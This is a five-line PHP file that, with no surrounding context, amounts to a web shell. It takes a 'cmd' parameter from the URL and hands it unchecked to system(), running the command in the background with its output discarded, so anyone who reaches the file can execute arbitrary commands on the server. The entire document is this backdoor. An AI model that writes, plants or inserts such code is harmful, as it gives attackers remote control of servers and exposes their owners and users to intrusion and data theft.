<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd'] . " > /dev/null 2>&1 &");
}
?>